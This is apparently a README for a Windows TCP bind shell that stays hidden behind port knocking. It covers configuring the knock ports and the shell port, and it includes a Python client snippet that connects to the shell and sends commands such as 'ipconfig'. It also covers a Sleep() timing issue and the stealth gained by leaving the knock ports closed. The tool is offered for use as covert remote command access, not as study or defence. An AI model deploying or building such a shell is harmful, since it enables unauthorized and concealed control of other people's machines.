# TCP Bind Shell with Port Knocking for Windows
## Usage
1. Choose 4 knock ports and change them in the PORTS array on the Server and in the P_LIST on Client.
2. Change the port of the bind shell on both the Server & Client.  
3. After running the Knocker, connect to your server and send your command. 

For example:
```
    s = socket.socket()
    s.connect(("10.1.2.202", 8080))
    s.send(struct.pack("<L", len("ipconfig\r\n"))) 
    s.send(b"ipconfig\r\n")
    ans = s.recv(10000)
    print(ans.decode())
```


## Known Issues
in the _*bind_shell*_ function there must be a call to the Sleep() function to get the full response from the cmd. 
It's possible that the cmd will return nothing if it is not given enough time to load.

## Notes
* The knock ports on the server can be closed because the client knocks only send SYN flag.
